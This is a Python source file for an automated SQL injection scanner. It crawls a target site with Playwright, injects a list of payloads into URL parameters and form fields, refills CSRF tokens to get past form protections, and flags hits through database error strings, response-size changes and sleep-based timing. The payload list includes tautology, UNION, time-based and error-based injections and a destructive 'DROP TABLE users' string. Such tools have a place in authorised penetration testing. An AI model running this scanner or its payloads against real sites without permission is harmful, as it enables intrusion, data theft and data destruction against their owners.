import asyncio
import logging
import requests
import os
import time  # FIX 1: moved to module level (was imported inside loops)
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from datetime import datetime
from tqdm import tqdm
from crawler import dfs
from playwright.async_api import async_playwright, BrowserContext
from playwright._impl._errors import TargetClosedError


# AI API endpoint
AI_API_URL = "http://127.0.0.1:8000/analyze"


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# SQL Injection Test Data
# ---------------------------------------------------------------------------

SQL_INJECTION_PAYLOADS = [
    # Basic detection
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "admin' --",
    "admin' #",
    "' or 'a'='a",
    
    # UNION-based SQLi
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    
    # Time-based blind SQLi
    "' AND SLEEP(5) --",
    "' AND pg_sleep(5) --",
    "'; WAITFOR DELAY '00:00:05' --",
    
    # Boolean-based blind SQLi
    "' AND '1'='1",
    "' AND '1'='2",
    
    # Error-based SQLi
    "' AND extractvalue(rand(),concat(0x3a,version())) --",
    "' AND updatexml(rand(),concat(0x3a,version()),1) --",
    
    # Comment-based variations
    "' /*",
    "'; DROP TABLE users --",
    
    # Double encoding
    "%27 OR %271%27=%271",
]

TIME_BASED_PAYLOADS = [
    ("' AND SLEEP(5) --", 5),
    ("' AND pg_sleep(5) --", 5),
    ("'; WAITFOR DELAY '00:00:05' --", 5),
]

ERROR_SIGNATURES = [
    "SQL syntax",
    "syntax error",
    "MySQL",
    "PostgreSQL",
    "Oracle",
    "MSSQL",
    "sqlite",
    "database error",
    "You have an error in your SQL",
    "Warning: mysql_",
    "Uncaught PDOException",
    "ORA-",
    "SQL Server error",
]


# ---------------------------------------------------------------------------
# Data Models
# ---------------------------------------------------------------------------

@dataclass
class SQLiTestResult:
    url: str
    parameter: Optional[str] = None
    payload: str = ""
    test_type: str = ""  # "url_param", "form_input", "header"
    vulnerable: bool = False
    confidence: float = 0.0  # 0.0 to 1.0
    response_time: float = 0.0
    status_code: int = 0
    error_message: Optional[str] = None
    evidence: Optional[str] = None
    form_action: Optional[str] = None
    form_method: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_dict(self) -> Dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "test_type": self.test_type,
            "vulnerable": self.vulnerable,
            "confidence": self.confidence,
            "response_time": self.response_time,
            "status_code": self.status_code,
            "error_message": self.error_message,
            "evidence": self.evidence,
            "form_action": self.form_action,
            "form_method": self.form_method,
            "timestamp": self.timestamp.isoformat(),
        }


# ---------------------------------------------------------------------------
# SQL Injector
# ---------------------------------------------------------------------------

class SQLInjectionTester:
    def __init__(
        self,
        page_timeout_ms: int = 30000,
        time_threshold_ms: float = 4000,
        check_errors: bool = True,
        check_union: bool = True,
        check_time_based: bool = True,
    ):
        self.page_timeout_ms = page_timeout_ms
        self.time_threshold_ms = time_threshold_ms
        self.check_errors = check_errors
        self.check_union = check_union
        self.check_time_based = check_time_based
        self.results: List[SQLiTestResult] = []

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _css_attr_selector(name: str) -> str:
        """Build a safe CSS attribute selector for input[name="..."].

        FIX A: The original code used backslash-escaping inside a CSS
        double-quoted attribute value (e.g. input[name="a\"b"]) which is
        invalid CSS.  The correct approach is to switch to single-quote
        delimiters and escape any single quotes that appear in the name.
        This matches the CSS spec (§ 4.3.7) and is accepted by all browsers
        and Playwright's selector engine.
        """
        safe_name = name.replace("\\", "\\\\").replace("'", "\\'")
        return f"input[name='{safe_name}']"

    # ------------------------------------------------------------------
    # Vulnerability Detection
    # ------------------------------------------------------------------

    def _detect_error_based_sqli(self, response_text: str) -> tuple[bool, Optional[str]]:
        """Detect SQL errors in response."""
        if not self.check_errors:
            return False, None
        
        for signature in ERROR_SIGNATURES:
            if signature.lower() in response_text.lower():
                return True, signature
        return False, None

    def _detect_union_based_sqli(
        self, response_text: str, baseline: str, status_code: int = 200
    ) -> bool:
        """Detect UNION-based SQLi by comparing response size/content.

        FIX 2: Added status_code guard. Error/redirect pages (4xx/5xx or very
        short bodies) caused false positives with the size-ratio heuristic alone.
        We now require:
          - A 200-level response, AND
          - A meaningful baseline length (avoids division-by-near-zero), AND
          - A significant size change relative to baseline.
        """
        if not self.check_union:
            return False

        # Only flag 2xx responses — error pages always differ in size
        if not (200 <= status_code < 300):
            return False

        # Ignore tiny baselines; they produce unreliable ratios
        if len(baseline) < 200:
            return False

        ratio = len(response_text) / len(baseline)
        return ratio > 1.5 or ratio < 0.5  # tightened from 1.2 / 0.8

    def _calculate_confidence(
        self,
        has_error: bool,
        has_union_diff: bool,
        response_time: float,
        payload: str,
    ) -> float:
        """Calculate vulnerability confidence score (0.0 to 1.0)."""
        confidence = 0.0
        
        if has_error:
            confidence += 0.7
        
        if has_union_diff:
            confidence += 0.3
        
        # Time-based bonus
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
            if response_time > self.time_threshold_ms:
                confidence += 0.5
        
        return min(1.0, confidence)

    # ------------------------------------------------------------------
    # URL Parameter Testing
    # ------------------------------------------------------------------

    async def test_url_parameter(
        self,
        context: BrowserContext,
        base_url: str,
        param_name: str,
        baseline_response: Optional[str] = None,
    ) -> List[SQLiTestResult]:
        """Test a URL parameter for SQL injection."""
        results = []
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if param_name not in params:
            logger.warning(f"Parameter {param_name} not found in {base_url}")
            return results

        # Get baseline response
        if not baseline_response:
            try:
                page = await context.new_page()
                page.set_default_timeout(self.page_timeout_ms)
                response = await page.goto(base_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                try:
                    await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                except asyncio.TimeoutError:
                    pass  # Continue anyway if network idle times out
                baseline_response = await page.content()
                await page.close()
            except (TargetClosedError, Exception) as e:
                logger.debug(f"Failed to get baseline for {base_url}: {e}")
                baseline_response = None

        # Test each payload
        for payload in SQL_INJECTION_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            # Flatten params for urlencode
            flat_params = {}
            for k, v in test_params.items():
                flat_params[k] = v[0] if isinstance(v, list) else v
            
            query_string = urlencode(flat_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
            
            page = None
            try:
                page = await context.new_page()
                page.set_default_timeout(self.page_timeout_ms)
                start_time = time.time()
                
                response = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                
                # Wait for network idle but don't fail if it times out
                try:
                    await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                except asyncio.TimeoutError:
                    logger.debug(f"Network idle timeout for {test_url}")
                
                response_text = await page.content()
                
                response_time = (time.time() - start_time) * 1000  # ms
                status_code = response.status if response else 0

                # Check for errors
                has_error, error_sig = self._detect_error_based_sqli(response_text)
                
                # FIX 2: pass status_code to union check to reduce false positives
                has_union_diff = (
                    self._detect_union_based_sqli(response_text, baseline_response, status_code)
                    if baseline_response else False
                )
                
                # Determine vulnerability
                is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms
                confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
                
                if is_vulnerable or confidence > 0.3:
                    result = SQLiTestResult(
                        url=test_url,
                        parameter=param_name,
                        payload=payload,
                        test_type="url_param",
                        vulnerable=is_vulnerable,
                        confidence=confidence,
                        response_time=response_time,
                        status_code=status_code,
                        error_message=error_sig,
                        evidence=response_text[:500] if has_error else None,
                    )
                    results.append(result)
                    self.results.append(result)
                    
                    if is_vulnerable:
                        logger.warning(f"[VULNERABLE] {param_name} in {base_url}")
                        logger.warning(f"  Payload: {payload}")
                        logger.warning(f"  Confidence: {confidence:.2%}")

            except (TargetClosedError, ConnectionError) as e:
                logger.debug(f"Target closed while testing {test_url}: {e}")
            except asyncio.TimeoutError:
                logger.debug(f"Timeout testing {test_url}")
            except Exception as e:
                logger.debug(f"Error testing {test_url}: {type(e).__name__}: {e}")
            finally:
                if page:
                    try:
                        await page.close()
                    except (TargetClosedError, Exception):
                        pass

        return results

    async def _extract_csrf_tokens(self, page) -> Dict[str, str]:
        """Extract CSRF/authenticity tokens from the page."""
        tokens = {}
        try:
            hidden_inputs = await page.query_selector_all('input[type="hidden"]')
            for input_elem in hidden_inputs:
                try:
                    name = await input_elem.get_attribute("name")
                    value = await input_elem.get_attribute("value")
                    if name and value:
                        tokens[name] = value
                        if any(kw in name.lower() for kw in ["csrf", "authenticity", "token", "_token"]):
                            logger.debug(f"Found CSRF token: {name}")
                except Exception:
                    pass
            
            csrf_inputs = await page.query_selector_all('[data-csrf], [data-authenticity-token]')
            for input_elem in csrf_inputs:
                try:
                    csrf_value = await input_elem.get_attribute("data-csrf")
                    if csrf_value:
                        tokens["_csrf"] = csrf_value
                    auth_value = await input_elem.get_attribute("data-authenticity-token")
                    if auth_value:
                        tokens["authenticity_token"] = auth_value
                except Exception:
                    pass
            
            csrf_meta = await page.query_selector('meta[name="csrf-token"]')
            if csrf_meta:
                try:
                    csrf_value = await csrf_meta.get_attribute("content")
                    if csrf_value:
                        tokens["_csrf"] = csrf_value
                except Exception:
                    pass
            
            try:
                cookies = await page.context.cookies()
                for cookie in cookies:
                    if any(kw in cookie.get("name", "").lower() for kw in ["csrf", "xsrf"]):
                        tokens[cookie["name"]] = cookie.get("value", "")
            except Exception:
                pass
                
        except Exception as e:
            logger.debug(f"Error extracting CSRF tokens: {e}")
        
        return tokens

    async def _fill_form_field_safe(self, page, selector: str, value: str, retries: int = 3) -> bool:
        """Safely fill a form field with retry logic."""
        for attempt in range(retries):
            try:
                await page.wait_for_selector(selector, timeout=3000)
                await page.wait_for_function(
                    f"document.querySelector({repr(selector)}).offsetParent !== null",
                    timeout=3000
                )
                await page.wait_for_timeout(100)
                await page.fill(selector, value, timeout=5000)
                return True
            except (TargetClosedError, ConnectionError) as e:
                logger.debug(f"Target closed while filling field {selector}: {e}")
                return False
            except Exception as e:
                if attempt < retries - 1:
                    await page.wait_for_timeout(100 * (attempt + 1))
                    continue
                logger.debug(f"Failed to fill {selector} after {retries} attempts: {e}")
                return False
        return False

    # ------------------------------------------------------------------
    # Form Testing
    # ------------------------------------------------------------------

    async def test_form(
        self,
        context: BrowserContext,
        form_data: Dict,
        base_url: str,
    ) -> List[SQLiTestResult]:
        """Test form inputs for SQL injection."""
        results = []
        action = form_data.get("action", base_url)
        method = form_data.get("method", "get").lower()
        inputs = form_data.get("inputs", [])

        if not inputs:
            return results

        # Get baseline response and extract tokens from the form page
        page = None
        baseline_response = None
        csrf_tokens = {}
        try:
            page = await context.new_page()
            page.set_default_timeout(self.page_timeout_ms)
            response = await page.goto(action, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
            try:
                await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
            except asyncio.TimeoutError:
                pass
            baseline_response = await page.content()
            csrf_tokens = await self._extract_csrf_tokens(page)
            if csrf_tokens:
                logger.debug(f"Extracted {len(csrf_tokens)} token(s) from form: {list(csrf_tokens.keys())}")
            await page.close()
        except (TargetClosedError, Exception) as e:
            logger.debug(f"Failed to get baseline for {action}: {e}")
            baseline_response = None

        # Test each input field
        for input_name in inputs:
            # FIX A: use _css_attr_selector() for correct single-quoted CSS escaping.
            # The original code used backslash-escaping inside double-quoted CSS attribute
            # values (input[name="a\"b"]) which is invalid per the CSS spec.
            selector = self._css_attr_selector(input_name)

            for payload in SQL_INJECTION_PAYLOADS:
                page = None
                try:
                    page = await context.new_page()
                    page.set_default_timeout(self.page_timeout_ms)
                    
                    await page.goto(base_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                    try:
                        await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                    except asyncio.TimeoutError:
                        pass
                    
                    # Extract fresh CSRF tokens for each test (tokens may rotate)
                    fresh_tokens = await self._extract_csrf_tokens(page)
                    
                    start_time = time.time()
                    status_code = 200  # default

                    if method == "post":
                        fill_success = await self._fill_form_field_safe(
                            page,
                            selector,
                            payload,
                            retries=2
                        )
                        
                        if fill_success:
                            # FIX A: use _css_attr_selector() for CSRF token selectors too.
                            # The original code had an inline f-string with backslash-escaping
                            # which produced invalid CSS (e.g. input[name="a\"b"]).
                            for token_name, token_value in fresh_tokens.items():
                                token_selector = self._css_attr_selector(token_name)
                                try:
                                    await page.fill(token_selector, token_value, timeout=2000)
                                    logger.debug(f"Filled CSRF token: {token_name}")
                                except Exception:
                                    pass
                            
                            # FIX B: capture the actual HTTP status code of the POST response
                            # by attaching a response listener before the form is submitted.
                            # The original code hardcoded status_code = 200 for all POST
                            # requests, making _detect_union_based_sqli unreliable (it always
                            # passed the 2xx guard, causing false positives on error pages).
                            last_response_status: list[int] = []

                            async def _capture_status(response):
                                # Only record the main document response (ignore sub-resources)
                                if response.request.resource_type == "document":
                                    last_response_status.append(response.status)

                            page.on("response", _capture_status)

                            try:
                                await page.click("button[type='submit']", timeout=3000)
                            except Exception:
                                await page.press(selector, "Enter")
                            
                            try:
                                await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                            except asyncio.TimeoutError:
                                pass

                            page.remove_listener("response", _capture_status)
                            if last_response_status:
                                status_code = last_response_status[-1]
                        else:
                            continue
                    else:
                        form_inputs = {}
                        for field_name in inputs:
                            form_inputs[field_name] = payload if field_name == input_name else "test"
                        
                        form_inputs.update(fresh_tokens)
                        
                        query_string = urlencode(form_inputs)
                        test_url = f"{action}?{query_string}"
                        response = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                        try:
                            await page.wait_for_load_state("networkidle", timeout=self.page_timeout_ms)
                        except asyncio.TimeoutError:
                            pass
                        status_code = response.status if response else 0
                    
                    response_time = (time.time() - start_time) * 1000  # ms
                    response_text = await page.content()

                    has_error, error_sig = self._detect_error_based_sqli(response_text)
                    # FIX 2: pass status_code to union check
                    has_union_diff = (
                        self._detect_union_based_sqli(response_text, baseline_response, status_code)
                        if baseline_response else False
                    )
                    
                    is_vulnerable = has_error or has_union_diff or response_time > self.time_threshold_ms
                    confidence = self._calculate_confidence(has_error, has_union_diff, response_time, payload)
                    
                    if is_vulnerable or confidence > 0.3:
                        result = SQLiTestResult(
                            url=action,
                            parameter=input_name,
                            payload=payload,
                            test_type="form_input",
                            vulnerable=is_vulnerable,
                            confidence=confidence,
                            response_time=response_time,
                            status_code=status_code,
                            error_message=error_sig,
                            evidence=response_text[:500] if has_error else None,
                            form_action=action,
                            form_method=method,
                        )
                        results.append(result)
                        self.results.append(result)
                        
                        if is_vulnerable:
                            logger.warning(f"[VULNERABLE] Form field {input_name} in {action}")
                            logger.warning(f"  Payload: {payload}")

                except (TargetClosedError, ConnectionError) as e:
                    logger.debug(f"Target closed while testing form field {input_name}: {e}")
                except asyncio.TimeoutError:
                    logger.debug(f"Timeout testing form field {input_name}")
                except Exception as e:
                    logger.debug(f"Error testing form field {input_name}: {type(e).__name__}: {e}")
                finally:
                    if page:
                        try:
                            await page.close()
                        except (TargetClosedError, Exception):
                            pass

        return results

    # ------------------------------------------------------------------
    # Batch Testing with Crawler Results
    # ------------------------------------------------------------------

    async def test_crawler_results(self, crawl_results) -> List[SQLiTestResult]:
        """Test all URLs and forms from crawler results."""
        all_results = []
        
        # FIX C: crawl_results is a synchronous generator (dfs.DFSCrawler.crawl()
        # returns a regular generator, not an async one).  The original code used
        # `async for` which raises TypeError on a plain generator.
        crawl_list = list(crawl_results)
        
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            context = await browser.new_context()
            
            # Block heavy resources
            await context.route(
                "**/*",
                lambda route: route.abort()
                if route.request.resource_type in {"image", "media", "font"}
                else route.continue_(),
            )
            
            with tqdm(total=len(crawl_list), desc="Testing pages", unit=" pages", colour="green") as pbar:
                for crawl_result in crawl_list:
                    logger.info(f"Testing {crawl_result.url}")
                    
                    if crawl_result.params:
                        for param in crawl_result.params:
                            results = await self.test_url_parameter(
                                context,
                                crawl_result.url,
                                param,
                            )
                            all_results.extend(results)
                    
                    if crawl_result.forms:
                        for form in crawl_result.forms:
                            results = await self.test_form(
                                context,
                                form,
                                crawl_result.url,
                            )
                            all_results.extend(results)
                    
                    pbar.update(1)
            
            await browser.close()
        
        return all_results

    # ------------------------------------------------------------------
    # Results
    # ------------------------------------------------------------------

    def get_results(self) -> List[SQLiTestResult]:
        return self.results

    def get_vulnerable_results(self) -> List[SQLiTestResult]:
        return [r for r in self.results if r.vulnerable]

    def get_summary(self) -> Dict:
        vulnerable = self.get_vulnerable_results()
        total = len(self.results)
        
        return {
            "total_tests": total,
            "vulnerabilities_found": len(vulnerable),
            "severity_distribution": {
                "high": sum(1 for r in vulnerable if r.confidence > 0.7),
                "medium": sum(1 for r in vulnerable if 0.5 < r.confidence <= 0.7),
                "low": sum(1 for r in vulnerable if r.confidence <= 0.5),
            },
            # FIX 5: filter out None before building the set
            "affected_parameters": list(
                {r.parameter for r in vulnerable if r.parameter is not None}
            ),
            "affected_urls": list(set(r.url for r in vulnerable)),
        }

    def print_summary(self):
        summary = self.get_summary()
        print("\n" + "=" * 80)
        print("SQL INJECTION TEST SUMMARY")
        print("=" * 80)
        print(f"Total Tests: {summary['total_tests']}")
        print(f"Vulnerabilities Found: {summary['vulnerabilities_found']}")
        print("\nSeverity Distribution:")
        print(f"  High: {summary['severity_distribution']['high']}")
        print(f"  Medium: {summary['severity_distribution']['medium']}")
        print(f"  Low: {summary['severity_distribution']['low']}")
        
        if summary['affected_parameters']:
            print(f"\nAffected Parameters: {', '.join(summary['affected_parameters'])}")
        
        if summary['affected_urls']:
            print(f"\nAffected URLs:")
            for url in summary['affected_urls'][:10]:
                print(f"  - {url}")
        print("=" * 80 + "\n")


# ---------------------------------------------------------------------------
# Entry Point (Example Usage)
# ---------------------------------------------------------------------------

async def run_example():
    crawler = dfs.DFSCrawler(
        base_url="https://target-site.com",
        max_depth=2,
        concurrency=3,
    )
    
    tester = SQLInjectionTester(
        page_timeout_ms=30000,
        time_threshold_ms=4000,
        check_errors=True,
        check_union=True,
        check_time_based=True,
    )
    
    await tester.test_crawler_results(crawler.crawl())
    tester.print_summary()
    
    vulnerabilities = tester.get_vulnerable_results()
    for vuln in vulnerabilities:
        print(f"[{vuln.test_type.upper()}] {vuln.url}")
        print(f"  Parameter: {vuln.parameter}")
        print(f"  Payload: {vuln.payload}")
        print(f"  Confidence: {vuln.confidence:.2%}")
        if vuln.error_message:
            print(f"  Error: {vuln.error_message}")
        print()


if __name__ == "__main__":
    asyncio.run(run_example())